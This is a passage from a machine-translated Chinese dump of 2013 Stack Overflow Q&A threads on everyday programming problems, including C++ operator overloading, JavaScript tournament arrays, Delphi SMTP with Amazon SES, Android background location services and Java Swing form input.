4.  **`ObjectInputStream`客户端正在使用导致流不匹配的对象读取该消息，因此违反了内部一致性检查。这就是为什么`StreamCorruptedException`在客户端抛出的原因。因此，与其使用`ObjectInputStream`读取服务器发送的普通消息，不如使用`BufferedReader`您在上面创建的对象.**

因此，在客户端，您的代码应修改为：

```
ObjectInputStream objectInput = new ObjectInputStream(kkSocket.getInputStream());
String message = in.readLine();//use BufferedReader to read the plain message coming from Server.
System.out.println("Message from server: "+message);
out.println("user");
Object obj = objectInput.readObject(); 
```

# haskell - Haskell中的前向和后向链接

> ID：15392672
> 
> 赞同：-7
> 
> 时间：2013-03-13T17:46:18.537
> 
> 标签：haskell, artificial-intelligence, expert-system

我正在尝试在haskell 中使用非常小的数据库（即某种文本文件和基本规则）实现前向/后向链接。帮助将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T18:53:00.900

以下是一些可能有用的 monad：

*   [逻辑](http://hackage.haskell.org/package/logict)
*   [加权搜索](http://hackage.haskell.org/package/weighted-search)

这些单子有一个失败的概念，它会自动回溯到以前的状态（它们以不同的方式回溯——使用哪种方式取决于你想要的行为）。

如果您正在进行统一，请[`StateT`](http://hackage.haskell.org/packages/archive/transformers/0.2.2.0/doc/html/Control-Monad-Trans-State-Lazy.html)在其中一个单子上使用从变量到其值的字典。

有了这些部分，反向链接逻辑引擎在 Haskell 中实际上非常小且容易。[我在大约 30 行中为我的一个项目写了类似的东西（如果你想要参考，它在这个文件](https://github.com/luqui/Djest/blob/master/Djest/Solver.hs)的后半部分。我怀疑你是否能够准确地使用它。）。

警告：虽然这个任务对于有经验的 Haskell 程序员来说很容易，但它使用了一些相对先进的概念，所以如果你还不了解 Haskell，那么必要的 30 行代码将很难想出。先做一个扩展[教程](http://learnyouahaskell.com/)。

# c++ - 给定一个基类作为参数，如果传递了派生类，我如何使用 op<< 重载来打印派生类的特征？

> ID：15392673
> 
> 赞同：1
> 
> 时间：2013-03-13T17:46:23.527
> 
> 标签：c++, inheritance, polymorphism, operator-overloading

这是一个家庭作业。

我有一个基类 Item 和一个派生类 Book。

我在 Item 类中重载了 op<<：

```
ostream& operator<<(ostream& out, const Item* const item)
{
    out << item->getName() << endl;
    return out;
} 
```

以及在书类中：

```
ostream& operator<<(ostream& out, const Book* const b)
{
    out << b->getPages() << endl;
    return out;
} 
```

但是，`Item`当我运行我的代码时，只使用了运算符，它不会打印一本书的页面。我已确保打印“书”，而不仅仅是基类。从我读过的材料看来，重载基类和派生类的运算符是你应该做的，所以我不确定为什么我的书信息没有被打印出来。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T17:49:40.760

您可以使用多态性而不是重载：向类添加虚拟打印方法：

```
class Item
{
 public:
  virtual void print(std::ostream& o) const
  {
    out << getName() << endl;
  }
 ....
};

class Book : public Item
{
 public:
  virtual void print(std::ostream& o) const
  {
    out << getPages() << endl;
  }
 ....
}; 
```

然后使用一个`ostream& operator<<`：

```
ostream& operator<<(ostream& out, const Item& item)
{
    item.print(out);
    return out;
} 
```

然后

```
Item* i1 = new Item(....);
Item* i2 = new Book(....);
std::cout << *i1 << " " << *i2 << std::endl;
delete i1;
delete i2; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T17:48:27.863

如果您更改派生类函数的签名，它不再是基类成员函数的覆盖。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T18:23:01.623

“但是，当我运行我的代码时，**只使用了 Item 运算符**” - 这种行为可能是因为您将它**应用于基类上的指针 */reference&**；

如果您有一个容器，您想在其中存储从同一基类派生的不同类的实例并将其应用于所有这些类 operator<<，该行为将取决于每个实例的类调用它，您有确保：

1.**您的基类中至少有一个虚拟方法**（这将导致编译器为该类生成 **虚拟表**，稍后此表可以由**operator dynamic_cast**使用）
2.在您的项目中**启用 RTTI**（运行时类型识别） : project/c++/language 启用 RTTI 支持 3.使用以下思想**实现 operator<< ：**

```
ostream& operator<<(ostream& out, const Item& item)
{
    if (Book* pBook = dynamic_cast<Book*>(&item)
    {
        out << pBook ->getName() << endl;
    }
    if (OtherDerivedClassName* pOtherDerivedClass = dynamic_cast<OtherDerivedClassName*>(&item)
    {
// do other interesting things
    }
    return out;
} 
```

# html - Processing.js - 在图像上绘图

> ID：15392675
> 
> 赞同：0
> 
> 时间：2013-03-13T17:46:26.810
> 
> 标签：html, canvas, processing, processing.js

使用 HTML5 Canvas 元素和 Processing.js，我想在图像上绘制圆形轮廓。但是，当我运行我的代码时，圆圈轮廓内的区域只是变成白色，而不是保留该区域中的图像信息。我怀疑这是一个图像加载问题，但我已经包含了评论：

```
/* @pjs preload="myImage.jpg"; */ 
```

我读过的将解决这个问题。我的整个 .pde 文件如下：

```
/* @pjs preload="myImage.jpg"; */

// Global Variables
PImage img;

// Data Storage
ArrayList cent_x;
ArrayList cent_y; 
ArrayList cent_r;

void setup() {
    // Establish Canvas
    size(760,560);

    // Load Image
    img = loadImage("myImage.jpg");

    // Initialize Data Structures
    cent_x = new ArrayList();
    cent_y = new ArrayList();
    cent_r = new ArrayList();
}

void draw() {
    // Draw Background Image
    image(img,0,0,width,height);    

    // Add to Data Structures
    if (mousePressed) {
        cent_x.add(mouseX);
        cent_y.add(mouseY);
        cent_r.add(15);     
    }

    // Draw all Marks
    for (int i = 0; i<cent_x.size(); i++) {
        int c_x = cent_x.get(i);
        int c_y = cent_y.get(i);
        int c_r = cent_r.get(i);

        stroke(255,255,0);
        ellipse(c_x,c_y,c_r,c_r);
    }
} 
```

关于为什么会发生这种情况的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:23:44.470

你需要调用 noFill(); 在调用 ellipse() 之前。应该这样做

# c# - 为什么 Visual Studio 2012 没有给我应该出现的错误？

> ID：15392679
> 
> 赞同：0
> 
> 时间：2013-03-13T17:46:40.293
> 
> 标签：c#, visual-studio, tfs

**编辑**我启动了一个新的控制台应用程序，以查看相关功能是否可以正常工作，并且它们完美无缺。我想现在的问题是**为什么当我在 TFS 中签出文件以进行编辑时它们不起作用**？

我刚刚下载了 Visual Studio 2012，经过一番挖掘，我仍然遇到了一些问题。Visual Studio 没有给我应该出现的错误（代码下的红色波浪线）。我做了一个虚假的 using 声明来说明：

![在此处输入图像描述](../Images/83799260c7acb8ab5e1e5f9482fc8450.png)

最后一个 using 语句显然是无效的，那么为什么它不告诉我呢？

另一个例子：

```
public String method()
{
    someVar = "hi";
} 
```

即使我在范围内的任何地方都没有设置 someVar 变量，也没有错误。我正在使用通过 TFS 获得的类，虽然我怀疑这很重要，但以防万一，我想我会提到它。

还应该注意的是，我确实启用了智能感知功能，但这些功能也不起作用。我该如何解决这种疯狂:-)？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-13T18:23:09.380

我猜你还没有打开任何项目。您刚刚打开了一个 C# 源文件。Visual Studio 无法在项目之外提供智能感知和错误检测，除了一些明显的错误（如缺少分号）。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-03-13T18:55:37.733

在这种情况下确定责任归属的最简单方法是打开：

工具 -> 选项 -> 文本编辑器 -> C# -> 高级

如果选中“编辑器中的错误下划线”和“显示实时语义错误”，您可能正在查看未标记为编译的文件，或者不是当前解决方案的一部分。

如果未选中它们，则您的插件之一可能会禁用它们，即

ReSharper > 选项 > 代码检查 > 设置 > 启用代码分析

# javascript - JavaScript - 为淘汰赛创建数组

> ID：15392681
> 
> 赞同：0
> 
> 时间：2013-03-13T17:46:42.000
> 
> 标签：javascript, arrays

我希望能够为淘汰赛生成空白比赛。这是我的意思的一个例子。

假设我们有一个 8 支球队的淘汰赛：我曾经计算出锦标赛`Math.log(teamList.length)/Math.log(2)`有 3 轮。

以下是计算每轮比赛数量的一般规则：

```
numberOfRounds = n    [ [2^n-1 matches], ...., [2^0 matches] ] 
```

所以我从这个知道，对于一个 8 队的锦标赛将有 3 轮，锦标赛将如下所示：

```
[ [4 matches], [2 matches], [1 match] ] 
```

我应该指出，每场比赛都存储为一个数组，因此例如 8 队锦标赛的半决赛可能如下所示：

```
[ [team1,team2], [team3,team4] ] 
```

我正在尝试生成一些代码，这意味着我可以获取团队列表，并为锦标赛生成一组空白比赛。

因此，如果我将 8 支球队的列表传递给锦标赛，则会生成以下匹配数组：

```
[
  [ [], [], [], [] ],
  [ [], [] ],
  [ [] ]
] 
```

有人对如何做到这一点有任何想法吗？到目前为止，我只有以下内容：

```
for(var i = 0; i < numRounds; i++) {
      matches.push([]);
} 
```

这会生成锦标赛的每一轮，因此对于 8 支球队，它会生成一个长度为 3 的数组，但我不知道如何在每轮内生成必要数量的比赛。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-13T18:00:42.183

这应该为给定数量的团队生成一个空匹配数组：

```
function genMatches (nTeams) {
    var matchArray = [];
    while (nTeams > 1) {
        nTeams = (nTeams + 1) >> 1;
        var matches = [];
        for (var i = 0; i < nTeams; ++i) {
            matches.push([]);
        }
        matchArray.push(matches);
    }
    return matchArray;
} 
```

它应该正确处理不是 2 次方的团队计数。它确实会为轮空轮生成一个插槽（当团队数量为奇数时）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-08-20T11:16:41.170

假设任何未与任何球队配对的球队已经有资格进入下一轮

```
function genMatches(a, match = 0, stage = {}) {
  let isOdd = false
  if (a === 1) {
    return match;
  }
  if (a % 2) {
    isOdd = true;
    a = a - 1;
  }
  match = match + Math.floor(a / 2);

  stage[Object.keys(stage).length] = new Array(Math.floor(a / 2)).fill([[],[]])
  a = Math.floor(a / 2)
  if (isOdd)
    a = a + 1;
 stage = {...stage,... genMatches(a, match, stage)};
 return stage;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-11-23T16:45:25.767

这将为您提供一个位置`BYE`以及 KnockOut Tournament 中的数量`BYES`。如果你想要第一轮比赛的数量

```
no.of matches in first round = (teamcount - byecount)/2 
```

```
total matches= teamcount -1 
```

```
const tournamentArray = teamsCount => {
  let totalMatches = teamsCount - 1;
	let byeCount = 0;
	let matchStructure = [];
	let log2 = Math.log2(teamsCount);
	let floorValue = Math.floor(log2);
	if (log2 > floorValue) {
        let tempPowerHolder = Math.pow(2, floorValue + 1);
		let matches = [];
		byeCount = tempPowerHolder - teamsCount;
		teamsCount = tempPowerHolder / 2;
		for (let i = 0; i < teamsCount; ++i) {
			matches.push([]);
		}
		matchStructure.push(matches);
	}

	while (teamsCount > 1) {
		teamsCount = (teamsCount + 1) >> 1;
		let matches = [];
		for (let i = 0; i < teamsCount; ++i) {
			matches.push([]);
		}
		matchStructure.push(matches);
	}

	return {
		byeCount,
    totalMatches,
		matchStructure
	};
};

console.log(tournamentArray(55))
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-10-11T07:48:30.867

```
 function matches(TotalTeams) {
        let teams = TotalTeams;
        let matches = [];
        let extraTeam = 0;

        while(teams > 1 ){
            if(teams % 2 === 1){
                teams = ((teams-1)/2);
                extraTeam  = extraTeam + 1
                matches.push(teams);
            }
            else{
                teams = ((teams)/2);
                matches.push(teams);
            }
            if(teams === 1){
                const add = (a, b) => a + b;
                const totalMatches = matches.reduce(add);
                return (totalMatches + extraTeam)

            }

        }
    }  

document.getElementById("33").innerHTML = matches(33);
document.getElementById("64").innerHTML = matches(64);
document.getElementById("69").innerHTML = matches(69);
document.getElementById("82").innerHTML = matches(82);
document.getElementById("98").innerHTML = matches(98); 
```

```
33 teams will play <span id="33"></span> matches<br/>
64 teams will play <span id="64"></span> matches<br/>
69 teams will play <span id="69"></span> matches<br/>
82 teams will play <span id="82"></span> matches<br/>
98 teams will play <span id="98"></span> matches<br/>
```

# delphi - 如何将 SMTP Amazon SES 与 Delphi 一起使用？

> ID：15392683
> 
> 赞同：1
> 
> 时间：2013-03-13T17:46:44.297
> 
> 标签：delphi, smtp, indy, amazon-ses

我有一个 Delphi 应用程序，它使用 Indy IdSMTP 对象向智能主机发送电子邮件。

我想使用带有 SMTP 接口的 Amazon SES 服务。根据[http://docs.aws.amazon.com/ses/latest/DeveloperGuide/smtp-connect.html](http://docs.aws.amazon.com/ses/latest/DeveloperGuide/smtp-connect.html)，我需要使用 TLS 连接。

我不确定应该为 IdSMTP 对象 UseTLS 属性使用哪个值，然后在 IOHandler 中指定什么值。

有没有在 Delphi 中使用 Amazon SES 的简单方法？现在我希望能够只发送文本电子邮件，但将来我可能需要发送 HTML 电子邮件。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-13T18:10:39.230

在连接到服务器之前，您需要为该属性分配一个启用 SSL 的`TIdIOHandler`组件，例如`TIdSSLIOHandlerSocketOpenSSL`，`TIdSMTP.IOHandler`并将该`TIdSMTP.UseEHLO`属性设置为 True。然后，您有两种选择来配置 TLS 设置：

1.  将`TIdSMTP.UseTLS`属性设置为`utUseExplicitTLS`，然后将`TIdSMTP.Port`属性设置为 25、587 或 2587（SES 上的所有三个端口都支持`utUseExplicitTLS`）。

2.  将`TIdSMTP.UseTLS`属性设置为`utUseImplicitTLS`，然后将`TIdSMTP.Port`属性设置为 465 或 2465（SES 上的两个端口都支持`utUseImplicitTLS`）。

这些`UseTLS`值之间的区别在于，`utUseExplicitTLS`它将连接到最初未加密的服务器，然后在需要时向服务器发送 SMTP`STARTTLS`命令以启用加密，而`utUseImplicitTLS`将连接到服务器并在任何与 SMTP 相关的数据可以交换之前立即启用加密。

亚马逊建议验证服务器的 TLS 证书以验证连接的完整性。您可以在属性中启用`sslvrfPeer`和`sslvrfFailIfNoPeerCert`标志`TIdSSLIOHandlerSocketOpenSSL.SSLOptions.VerifyMode`，然后`TIdSSLIOHandlerSocketOpenSSL.OnVerifyPeer`根据需要使用该事件来验证证书详细信息。

# android - 当应用程序切换到后台时，我的 android 位置服务被终止

> ID：15392688
> 
> 赞同：2
> 
> 时间：2013-03-13T17:46:58.340
> 
> 标签：android, android-location

如果我的问题重复或简单，请向我道歉。在这个问题上挣扎了很久。

即使我的应用切换到后台，我也需要跟踪用户的位置。在网上冲浪时，我发现可以将位置处理器代码编写为服务，这样服务就不会被杀死，我们可以获取用户的位置（在两种状态 - 应用程序在前台和应用程序在后台运行时）。

当我的应用程序处于前台时，我能够连续跟踪用户的位置。但是，当我将应用程序切换到后台时，我觉得我的位置服务停止了并且我无法跟踪用户的位置。请在下面找到我的代码：

**AndroidManifest.xml**：

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.testmylocation"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="15" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <activity
            android:name=".MainActivity"
            android:label="@string/title_activity_main" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service android:name=".MyService"/>
    </application>
</manifest> 
```

**MainActivity.java**：

```
package com.example.testmylocation;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu;
import android.view.Window;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.activity_main);

        startService(new Intent(this, MyService.class)); 
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
} 
```

**我的服务.java**：

```
package com.example.testmylocation;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;

public class MyService extends Service
{
    private static final String TAG = "TestMyLocation";
    private LocationManager mLocationManager = null;
    private static final int LOCATION_INTERVAL = 0;
    private static final float LOCATION_DISTANCE = 0;
    long itsBatchId = 0;

    private class LocationListener implements android.location.LocationListener
    {
        Location mLastLocation;
        public LocationListener(String provider)
        {
            mLastLocation = new Location(provider);
        }

        @Override
        public void onLocationChanged(Location location)
        {        
            Thread aThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    sendLocationValues(location);
                }
            });
            aThread.start();
        }

        @Override
        public void onProviderDisabled(String provider)
        {
            Log.e(TAG, "onProviderDisabled: " + provider);            
        }

        @Override
        public void onProviderEnabled(String provider)
        {
            Log.e(TAG, "onProviderEnabled: " + provider);
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras)
        {
            Log.e(TAG, "onStatusChanged: " + provider);
        }
    } 

    private void sendLocationValues(Location theLocation) 
    {
        //A web service will be called and the user's current location will be stored in server
    }

    LocationListener[] mLocationListeners = new LocationListener[] 
    {
            new LocationListener(LocationManager.GPS_PROVIDER),
            new LocationListener(LocationManager.NETWORK_PROVIDER)
    };

    @Override
    public IBinder onBind(Intent arg0)
    {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        super.onStartCommand(intent, flags, startId);       
        return START_STICKY;
    }

    @Override
    public void onCreate()
    {
        initializeLocationManager();    
        itsLocationHandler.sendEmptyMessage(1);
    }

    private Handler itsLocationHandler = new Handler() 
    {
        @Override
        public void handleMessage(Message theMessage) 
        {
            if(theMessage.what == 1)
            {
                try 
                {
                    mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, LOCATION_INTERVAL, LOCATION_DISTANCE, mLocationListeners[1]);
                } 
                catch (java.lang.SecurityException ex) 
                {
                    Log.i(TAG, "fail to request location update, ignore", ex);
                } 
                catch (IllegalArgumentException ex) 
                {
                    Log.d(TAG, "network provider does not exist, " + ex.getMessage());
                }
            }
        }
    };

    @Override
    public void onDestroy()
    {
        super.onDestroy();
    } 

    private void initializeLocationManager() 
    {
        if (mLocationManager == null) 
        {
            mLocationManager = (LocationManager) getApplicationContext().getSystemService(Context.LOCATION_SERVICE);
        }
    }
} 
```

谁能纠正我做错了什么。

谢谢你。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-13T18:06:48.720

自 Android 4.0 以来，操作系统在杀死不必要的进程方面变得更加激进。如果即使您的应用程序在后台，您也需要跟踪用户的位置，那么您需要将您的服务声明为前台服务。这提高了服务的优先级，因此除非它真的需要资源，否则 Android 不太可能杀死它。有关如何执行此操作的详细信息，请参阅[在前台运行服务。](http://developer.android.com/guide/components/services.html#Foreground)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-13T18:08:15.833

> 位置处理器代码可以写成服务，这样服务就**不会**被杀死

没有什么可以保证该服务永远不会被杀死，但是您可以通过获取[`WakeLock`](http://developer.android.com/reference/android/os/PowerManager.WakeLock.html)并启动它来增加您的服务继续运行的可能性[`Foreground service`](http://developer.android.com/guide/components/services.html#Foreground)

我建议您检查一些开源项目，例如[Open GPS Tracker](http://code.google.com/p/open-gpstracker/)和[Traceper](http://code.google.com/p/traceper/)

# file-upload - 移动 Safari 使用相机多次上传

> ID：15392689
> 
> 赞同：14
> 
> 时间：2013-03-13T17:46:58.707
> 
> 标签：file-upload, mobile-safari

这与 iOS6 的处理能力有关`<input type="file" />`。

当您要求单个文件时：

```
<input type="file" accept="image/*,video/*"> 
```

*   [http://jsfiddle.net/CJSU6/1/](http://jsfiddle.net/CJSU6/1/)
*   [https://www.dropbox.com/s/d18kcin8eyypjd3/2013-03-13%2010.40.22.png](https://www.dropbox.com/s/d18kcin8eyypjd3/2013-03-13%2010.40.22.png)

但是当你要求多个文件时，用户被直接发送到画廊

```
<input type="file" accept="image/*,video/*" multiple="multiple"> 
```

*   [http://jsfiddle.net/CJSU6/0/](http://jsfiddle.net/CJSU6/0/)
*   [https://www.dropbox.com/s/b3uugzweoeqbtlc/2013-03-13%2010.39.58.png](https://www.dropbox.com/s/b3uugzweoeqbtlc/2013-03-13%2010.39.58.png)

如果您要求多个文件，是否无法访问相机？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-03-23T17:46:22.707

**iOS 9+ 更新：**在 iOS 9 中对焦`<input type="file" />`时，用户可以选择是拍照还是从照片库中选择图片。即使在指定`multiple`属性时，此功能也是一致的。
^(感谢[Voodoo](https://stackoverflow.com/users/135476/voodoo)的[提醒评论](https://stackoverflow.com/questions/15392689/mobile-safari-multiple-upload-with-camera/15590056?noredirect=1#comment53251831_15590056)！)

* * *

相机在多选上传时不可用的原因是因为 iOS 设计为允许“*选择多张照片*”或“*拍摄一张照片并选择**它***”。

从历史上看，“拍照”选项总是允许用户将一张临时照片保存到内存中，并且该单张照片被提供给应用程序，而不允许选择其他保存的照片。事实上，现场拍摄的临时照片并**没有**保存到相机胶卷中。

使用 HTML 时唯一的解决方法是指示用户提前拍摄多张照片，**然后**将它们一起上传。

您可以在 Messages（以前的 SMS）应用程序中看到类似的情况，您可以在其中获得相同的选择。选择拍照，将让您拍照，然后立即放置发送。它是一个应用程序的事实允许您通过随后按下图片按钮来继续添加。但是，HTML 输入字段并非如此。

PS。我记得早在 iOS 4 就是这种情况。

* * *

作为最后的手段，您可以创建自己的“简单”iOS 应用程序，允许用户选择图片，或同时拍摄和上传。

# c++ - 数组列表的问题以及使用给定的插入和检索函数（段核心转储）

> ID：15392696
> 
> 赞同：-1
> 
> 时间：2013-03-13T17:47:10.203
> 
> 标签：c++, arrays, list, insert

我很难在我的数组列表中实现一些函数。

我想使用预定义的函数“插入”将一个值插入到列表中。然后我想使用检索函数打印出整个列表的值。

但是，当我测试我的函数时，程序在插入最后一个值后以分段核心转储退出

任何帮助，将不胜感激。

标题：

```
/** @file ListA.h */
#include <string>
using namespace std;
const int MAX_LIST = 0;
typedef string ListItemType;
class List
{

public:
   List();
   bool isEmpty() const;
   int getLength() const;
   void insert(int index, const ListItemType& newItem, bool& success);
   void retrieve(int index, ListItemType& dataItem, bool & success) const;
   void remove(int index, bool& success);
   List selectionSort(List selectList);
private:
    ListItemType items[];
    int size;
    int translate(int index) const;
}; 
```

执行：

```
 /** @file ListA.cpp */
#include "ArrayList.h"  // header file
#include <iostream>
#include <fstream>
List::List() : size()
{
}
bool List::isEmpty() const
{
   return size == 0;
}
int List::getLength() const
{
   return size;
}
void List::insert(int index, const ListItemType& newItem, bool& success)
{
   success = (index >= 1) &&
             (index <= size + 1) &&
             (size < MAX_LIST);
   if (success)
   {
      for (int pos = size; pos >= index; --pos)

         items[translate(pos + 1)] = items[translate(pos)];
      items[translate(index)] = newItem;

      ++size;

   }

}
void List::remove(int index, bool& success)
{
   success = (index >= 1) && (index <= size);
   if (success)
   {
      for (int fromPosition = index + 1;
       fromPosition <= size;
       ++fromPosition)
         items[translate(fromPosition - 1)] = items[translate(fromPosition)];
      --size;  // decrease the size of the list by one
   }  // end if

}  // end remove

void List::retrieve(int index, ListItemType& dataItem,
bool& success) const
{
   success = (index >= 1) && (index <= size);
   if (success)
      dataItem = items[translate(index)];
}

int List::translate(int index) const
{
   return index - 1;
}

List List::selectionSort(List selectList)

{

return selectList;
}

 int main()
 {
 ListItemType insertType = "listItem1";
 ListItemType retrieveType = "listitem2";
 int numberofitems;
 cout << "Please enter the number of data items:" << endl;
 cin >> numberofitems;
 cout << endl;
 cout << "Please enter the data items, one per line:" << endl;
 int listofitems[numberofitems];
 List myArrayList;
 cout << myArrayList.getLength() << endl;
        if (myArrayList.isEmpty())  // tests before
    {
        cout << "This list is empty \n" << endl;
    }
    else
    {
        cout << "List is not empty! \n"<< endl;
    }
 bool mainsucc = true;
 for (int i = 0; i<numberofitems; i++)
 {
 cout << "Enter number " << i + 1 << " : " << endl;
 cin >> listofitems[i];
 }
 for (int i =0; i <numberofitems; i++){
 myArrayList.insert(listofitems[i],  insertType, mainsucc);}
 cout << "Size of the list is : " << myArrayList.getLength() << endl;
/*for (int i=0; i<mainarraylistsize; i++)
 {
 cout << myArrayList.retrieve(listofitems[i], retrieveType, mainsucc);
}*/
if (myArrayList.isEmpty())  // tests after
    {
        cout << "This list is empty \n" << endl;
    }
    else
    {
        cout << "List is not empty! \n"<< endl;
    }
 return 1;
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T17:59:04.037

拥有 MAX_LIST == 0 意味着成功在您的插入函数中始终为假。

# java - 如何从 JFrame 表单中获取输入？

> ID：15392699
> 
> 赞同：1
> 
> 时间：2013-03-13T17:47:25.090
> 
> 标签：java, swing, jframe, jtextfield, springlayout

我正在尝试获取我在 JFrame 表单中提交的输入并将其存储在 arraylist 中。当我的 ActionEvent 发生时，我不确定如何获取我在文本字段中输入的内容。谁能告诉我该怎么做？

我的表格目前看起来像![这](../Images/df1d77dbf3615eaf17627aa8d9383234.png)

这是我的代码：

```
public class SpringDemo {
    private static void createAndShowGUI() {
        final String[] labels = {"Bill: ", "Last Top Up Date: ", "Same Network? "};
        int labelsLength = labels.length;

        //Create and populate the panel.
        JPanel p = new JPanel(new SpringLayout());
        for (int i = 0; i < labelsLength; i++) {
            JLabel l = new JLabel(labels[i], JLabel.TRAILING);
            p.add(l);
            JTextField textField = new JTextField(10);
            l.setLabelFor(textField);
            p.add(textField);
        }
        JButton button = new JButton("Submit");
        p.add(new JLabel());
        p.add(button);

        //Lay out the panel.
        SpringUtilities.makeCompactGrid(p,
                                    labelsLength + 1, 2, //rows, cols
                                    7, 7,        //initX, initY
                                    7, 7);       //xPad, yPad

        button.addActionListener(new ActionListener() {

            public void actionPerformed(ActionEvent e) {

                //Execute when button is pressed
                System.out.println("Test");
            }
        });  
        //Create and set up the window.
        JFrame frame = new JFrame("SpringForm");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        //Set up the content pane.
        p.setOpaque(true);  //content panes must be opaque
        frame.setContentPane(p);

        //Display the window.
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        //Schedule a job for the event-dispatching thread:
        //creating and showing this application's GUI.
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                createAndShowGUI();
            }
        });
    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-13T17:55:26.613

为此，您的`createAndShowGUI`方法应该是这样的：

```
private static void createAndShowGUI() {
    final String[] labels = {"Bill: ", "Last Top Up Date: ", "Same Network? "};
    int labelsLength = labels.length;
    final JTextField[] textField = new JTextField[labels.length];
    //Create and populate the panel.
    JPanel p = new JPanel(new SpringLayout());
    for (int i = 0; i < labelsLength; i++) {
        JLabel l = new JLabel(labels[i], JLabel.TRAILING);
        p.add(l);
        textField[i] = new JTextField(10);
        l.setLabelFor(textField[i]);
        p.add(textField[i]);
    }
    JButton button = new JButton("Submit");
    p.add(new JLabel());
    p.add(button);

    //Lay out the panel.
    SpringUtilities.makeCompactGrid(p,
                                    labelsLength + 1, 2, //rows, cols
                                    7, 7,        //initX, initY
                                    7, 7);       //xPad, yPad

    button.addActionListener(new ActionListener() {

        public void actionPerformed(ActionEvent e)
        {
            for (int i = 0 ; i < labels.length ; i++)
            {
                System.out.println(labels[i]+"->"+textField[i].getText());
            }
        }
    });  
    //Create and set up the window.
    JFrame frame = new JFrame("SpringForm");
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

    //Set up the content pane.
    p.setOpaque(true);  //content panes must be opaque
    frame.setContentPane(p);

    //Display the window.
    frame.pack();
    frame.setVisible(true);
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-13T17:58:16.147

将 s保存`JTextField`在列表中，并在您的动作侦听器中引用它们。

```
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.SpringLayout;

public class SpringDemo {
    private static void createAndShowGUI() {
        final String[] labels = { "Bill: ", "Last Top Up Date: ",
                "Same Network? " };
        int labelsLength = labels.length;
        final List<JTextField> textFields = new ArrayList<JTextField>();

        // Create and populate the panel.
        JPanel p = new JPanel(new SpringLayout());
        for (int i = 0; i < labelsLength; i++) {
            JLabel l = new JLabel(labels[i], JLabel.TRAILING);
            p.add(l);
            JTextField textField = new JTextField(10);
            textFields.add(textField);
            l.setLabelFor(textField);
            p.add(textField);
        }
        JButton button = new JButton("Submit");
        p.add(new JLabel());
        p.add(button);

        // Lay out the panel.
        SpringUtilities.makeCompactGrid(p, labelsLength + 1, 2, // rows, cols
                7, 7, // initX, initY
                7, 7); // xPad, yPad

        button.addActionListener(new ActionListener() {

            public void actionPerformed(ActionEvent e) {

                // Execute when button is pressed
                System.out.println("Test");
                for (JTextField jTextField : textFields) {
                    String s = jTextField.getText();
                }
            }
        });
        // Create and set up the window.
        JFrame frame = new JFrame("SpringForm");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // Set up the content pane.
        p.setOpaque(true); // content panes must be opaque
        frame.setContentPane(p);

        // Display the window.
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        // Schedule a job for the event-dispatching thread:
        // creating and showing this application's GUI.
        javax.swing.SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                createAndShowGUI();
            }
        });
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-13T17:51:57.967

你会用

```
textField.getText(); 
```

除非我错了。

